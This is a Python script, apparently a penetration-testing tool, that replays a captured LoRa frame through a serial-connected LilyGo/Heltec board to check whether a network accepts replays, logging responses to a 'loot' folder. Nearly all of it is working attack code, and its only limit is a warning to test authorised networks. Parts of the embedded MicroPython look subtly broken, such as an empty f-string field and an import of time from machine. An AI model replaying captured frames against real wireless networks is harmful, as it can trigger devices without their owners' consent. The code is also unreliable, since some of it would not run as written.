#!/usr/bin/env python3
"""
lora-replay-test.py
Description : Replay a captured LoRa packet to test replay protection.
              Transmits a previously captured frame and monitors for
              responses indicating the network accepted the replay.
              A successful response = insufficient replay protection.
Requires    : mpremote or serial access to LilyGo/Heltec LoRa32
Usage       : python3 lora-replay-test.py <serial_port> <hex_payload> <freq_mhz> [repeat]
Example     : python3 lora-replay-test.py /dev/ttyUSB0 0102030405060708 915.0 3
WARNING     : Only test on networks you are authorised to assess.
"""

import sys
import time
import os
import serial
from datetime import datetime

if len(sys.argv) < 4:
    print(f"Usage: {sys.argv[0]} <serial_port> <hex_payload> <freq_mhz> [repeat=1]")
    sys.exit(1)

SERIAL_PORT = sys.argv[1]
HEX_PAYLOAD = sys.argv[2]
FREQ_MHZ    = float(sys.argv[3])
REPEAT      = int(sys.argv[4]) if len(sys.argv) > 4 else 1

LOOT_DIR = f"./loot/lora-replay-{datetime.now().strftime('%Y%m%d_%H%M%S')}"
os.makedirs(LOOT_DIR, exist_ok=True)
LOG_FILE = os.path.join(LOOT_DIR, "replay_results.txt")

try:
    bytes.fromhex(HEX_PAYLOAD)
except ValueError:
    print("[!] Invalid hex payload")
    sys.exit(1)

print(f" ==================================================")
print(f"  LoRa Replay Test")
print(f"  Port     : {SERIAL_PORT}")
print(f"  Frequency: {FREQ_MHZ} MHz")
print(f"  Payload  : {HEX_PAYLOAD[:32]}{'...' if len(HEX_PAYLOAD) > 32 else ''}")
print(f"  Repeat   : {REPEAT}x")
print(f" ==================================================")
print("[!] WARNING: Authorised testing only.")

# MicroPython TX script
TX_SCRIPT = f"""
from machine import SPI, Pin, time
try:
    from sx1276 import SX1276
except:
    from sx1262 import SX1262 as SX1276
lora = SX1276(spi=SPI(1), cs=Pin(18), irq=Pin(26), rst=Pin(14))
lora.set_freq({int(FREQ_MHZ * 1e6)})
lora.set_sf(7)
lora.set_bw(125000)
payload = bytes.fromhex('{HEX_PAYLOAD}')
for i in range({REPEAT}):
    lora.send(payload)
    print(f'TX_DONE {{i+1}}')
    time.sleep_ms(500)
# Listen for response
lora.recv_start()
start = time.ticks_ms()
while time.ticks_ms() - start < 5000:
    if lora.rx_done():
        pkt = lora.read()
        print(f'RESPONSE:{{}}'.format(''.join(f'{{b:02x}}' for b in pkt)))
        break
print('TEST_COMPLETE')
"""

try:
    ser = serial.Serial(SERIAL_PORT, 115200, timeout=3)
    ser.write(b'\x03\x03\r\n')
    time.sleep(0.5)
    ser.write(b'\x01')  # Raw REPL
    time.sleep(0.2)

    for line in TX_SCRIPT.strip().split('\n'):
        ser.write(line.encode() + b'\n')
        time.sleep(0.05)
    ser.write(b'\x04')

    print("[*] Transmitting...")
    responses = []

    with open(LOG_FILE, 'w') as log:
        timeout = time.time() + (REPEAT * 2) + 8
        while time.time() < timeout:
            line = ser.readline().decode(errors='ignore').strip()
            if 'TX_DONE' in line:
                ts = datetime.now().strftime('%H:%M:%S')
                print(f"  [{ts}] {line}")
                log.write(f"{ts},{line}\n")
            elif 'RESPONSE:' in line:
                resp_hex = line.split(':')[1]
                responses.append(resp_hex)
                print(f"  [!] RESPONSE RECEIVED: {resp_hex}")
                log.write(f"RESPONSE,{resp_hex}\n")
            elif 'TEST_COMPLETE' in line:
                break

    if responses:
        print(f"\n[!] Network RESPONDED to replay — replay protection may be absent!")
        print(f"    Responses: {len(responses)}")
    else:
        print(f"\n[+] No response — replay protection appears active or frame was ignored.")

    print(f"[+] Log: {LOG_FILE}")

except serial.SerialException as e:
    print(f"[!] Serial error: {e}")
except KeyboardInterrupt:
    print("\n[*] Interrupted.")
